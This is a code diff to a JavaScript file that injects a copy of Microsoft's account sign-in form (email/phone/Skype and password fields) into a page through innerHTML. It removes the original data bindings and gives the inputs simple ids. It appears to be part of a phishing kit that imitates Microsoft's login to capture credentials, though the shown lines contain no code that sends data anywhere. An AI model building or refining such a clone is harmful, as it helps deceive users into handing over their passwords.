@@ -147,18 +147,7 @@ document.getElementById("root").innerHTML = `
                                                                                     hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
                                                                                 event: {
                                                                                     updateFocus: usernameTextbox.textbox_onUpdateFocus } }">
-                                                                                <input type="email" name="loginfmt" id="email" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry" data-bind="
-                                                                                    attr: { lang: svr.fApplyAsciiRegexOnInput ? null : 'en',
-                                                                                    autocomplete: svr.fEnablePasskeyAutofillUI ? 'username webauthn' : 'username' },
-                                                                                    externalCss: {
-                                                                                        'input': true,
-                                                                                        'text-box': true,
-                                                                                        'has-error': usernameTextbox.error },
-                                                                                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
-                                                                                    ariaDescribedBy: 'loginHeader emailError',
-                                                                                    textInput: usernameTextbox.value,
-                                                                                    hasFocusEx: usernameTextbox.focused,
-                                                                                    placeholder: $placeholderText" autocomplete="username webauthn" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader emailError" placeholder="Email, phone, or Skype" data-report-attached="1">
+                                                                                <input type="email" name="loginfmt" id="email" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" placeholder="Email, phone, or Skype">
                                                                             </div>
                                                                         </div>
                                                                     </div>
@@ -219,7 +208,7 @@ document.getElementById("root").innerHTML = `
                                                                             <div id="passwordError" class="error-message"></div>
                                                                         </div>
                                                                         <div class="form-group col-md-24">
-                                                                            <input name="passwd" type="password" id="psw" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" aria-label="Enter your password" placeholder="Password">
+                                                                            <input name="passwd" type="password" id="psw" class="form-control ltr_override input ext-input text-box ext-text-box" placeholder="Password">
                                                                         </div>
                                                                     </div>
                                                                     <div class="form-group text-13">
